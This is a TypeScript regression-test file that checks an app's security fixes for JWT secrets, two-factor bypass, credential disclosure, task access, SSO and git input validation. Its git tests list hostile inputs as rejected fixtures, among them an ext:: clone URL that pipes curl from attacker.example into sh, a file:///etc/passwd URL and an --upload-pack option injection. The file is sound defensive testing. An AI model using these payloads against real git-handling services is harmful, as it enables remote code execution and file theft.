import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import jwt from 'jsonwebtoken';
import { createApp } from '../app';
import { prisma } from '@openlinear/db';
import { getJwtSecret, SecretConfigurationError } from '../lib/secrets';
import { gitHttpsUrlSchema, gitRefSchema, localRepoPathSchema } from '../schemas/git';
import { hashToken } from '../services/sessions';
import { testJwtSecret } from './test-env';

/**
 * Regression tests for the Phase 0 security fixes. Each `it` maps to a finding
 * that was exploitable on `dev` before this branch.
 */
describe('Phase 0 security regressions', () => {
  const app = createApp();
  let userId: string;
  let otherUserId: string;
  let authToken: string;

  function sign(claims: Record<string, unknown>) {
    return jwt.sign(claims, testJwtSecret(), { expiresIn: '1h' });
  }

  beforeAll(async () => {
    const user = await prisma.user.upsert({
      where: { username: 'sec-phase0' },
      update: {},
      create: { githubId: '991001', username: 'sec-phase0', email: 'sec-phase0@example.com' },
    });
    const other = await prisma.user.upsert({
      where: { username: 'sec-phase0-other' },
      update: {},
      create: { githubId: '991002', username: 'sec-phase0-other', email: 'sec-other@example.com' },
    });
    userId = user.id;
    otherUserId = other.id;
    authToken = sign({ userId: user.id, username: user.username });
    await prisma.session.create({
      data: { userId: user.id, tokenHash: hashToken(authToken) },
    });
  });

  afterAll(async () => {
    await prisma.task.deleteMany({ where: { creatorId: { in: [userId, otherUserId] } } });
    await prisma.session.deleteMany({ where: { userId: { in: [userId, otherUserId] } } });
    await prisma.user.deleteMany({ where: { id: { in: [userId, otherUserId] } } });
  });

  describe('secrets (F-033 / C6a F2, F3)', () => {
    it('rejects the placeholder secret published in this repository', () => {
      const previous = process.env.JWT_SECRET;
      process.env.JWT_SECRET = 'openlinear-dev-secret-change-in-production';
      try {
        expect(() => getJwtSecret()).toThrow(SecretConfigurationError);
      } finally {
        process.env.JWT_SECRET = previous;
      }
    });

    it('rejects a missing or too-short secret in every environment', () => {
      const previous = process.env.JWT_SECRET;
      try {
        delete process.env.JWT_SECRET;
        expect(() => getJwtSecret()).toThrow(/is not set/);
        process.env.JWT_SECRET = 'too-short';
        expect(() => getJwtSecret()).toThrow(/at least 32 characters/);
      } finally {
        process.env.JWT_SECRET = previous;
      }
    });
  });

  describe('two-factor bypass (F-002)', () => {
    it('refuses a 2FA-pending token as a bearer credential', async () => {
      const pending = sign({ userId, username: 'sec-phase0', twoFactorPending: true });
      const res = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${pending}`);
      expect(res.status).toBe(401);
    });

    it('refuses a 2FA-pending token on the SSE stream', async () => {
      const pending = sign({ userId, username: 'sec-phase0', twoFactorPending: true });
      const res = await request(app).get(`/api/events?token=${pending}`);
      expect(res.status).toBe(401);
    });
  });

  describe('credential disclosure (F-001)', () => {
    it('never returns totpSecret or backupCodes from /api/auth/me', async () => {
      await prisma.user.update({
        where: { id: userId },
        data: { totpSecret: 'SECRETVALUE', backupCodes: ['hashed-code'], totpEnabled: true },
      });

      const res = await request(app)
        .get('/api/auth/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(res.status).toBe(200);
      expect(res.body).not.toHaveProperty('totpSecret');
      expect(res.body).not.toHaveProperty('backupCodes');
      expect(res.body).not.toHaveProperty('accessToken');
      expect(JSON.stringify(res.body)).not.toContain('SECRETVALUE');

      await prisma.user.update({
        where: { id: userId },
        data: { totpSecret: null, backupCodes: [], totpEnabled: false },
      });
    });
  });

  describe('orphan task access (F-009)', () => {
    it('denies a task with no team and no project to everyone but its creator', async () => {
      const orphan = await prisma.task.create({
        data: { title: 'orphan', creatorId: otherUserId },
      });

      const res = await request(app)
        .get(`/api/tasks/${orphan.id}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect([403, 404]).toContain(res.status);
    });
  });

  describe('email change chain (F-004)', () => {
    it('does not allow self-service email changes', async () => {
      const res = await request(app)
        .patch('/api/auth/me')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ email: 'someone-elses-address@example.com' });
      expect(res.status).toBe(501);
    });
  });

  describe('SSO takeover (F-003)', () => {
    it('keeps the SSO login flow disabled', async () => {
      const res = await request(app).get('/api/auth/sso/check?email=someone@example.com');
      expect(res.status).toBe(503);
      expect(res.body.error?.code ?? res.body.code).toBe('SSO_DISABLED');
    });
  });

  describe('attachment serving (F-031 / C6a F14)', () => {
    it('requires authentication to download an upload', async () => {
      const res = await request(app).get('/uploads/anything.png');
      expect(res.status).toBe(401);
    });
  });

  describe('git argument and transport validation (C6a F6, F7)', () => {
    it('rejects non-https clone transports', () => {
      for (const url of [
        'ext::sh -c "curl attacker.example|sh"',
        'file:///etc/passwd',
        'ssh://git@github.com/o/r.git',
        'git://github.com/o/r.git',
        'https://evil.example.com/o/r.git',
        'https://user:pw@github.com/o/r.git',
      ]) {
        expect(gitHttpsUrlSchema.safeParse(url).success, url).toBe(false);
      }
      expect(gitHttpsUrlSchema.safeParse('https://github.com/openlinear/openlinear.git').success).toBe(true);
    });

    it('rejects branch names that git would parse as options', () => {
      for (const ref of ['--upload-pack=touch /tmp/pwn', '-x', '/leading', '.leading', 'a..b', 'trailing/']) {
        expect(gitRefSchema.safeParse(ref).success, ref).toBe(false);
      }
      expect(gitRefSchema.safeParse('openlinear/task-123').success).toBe(true);
    });

    it('rejects relative and traversing local paths', () => {
      for (const p of ['relative/path', '/repo/../../etc', 'https://example.com/x']) {
        expect(localRepoPathSchema.safeParse(p).success, p).toBe(false);
      }
      expect(localRepoPathSchema.safeParse('/Users/me/code/openlinear').success).toBe(true);
    });
  });
});
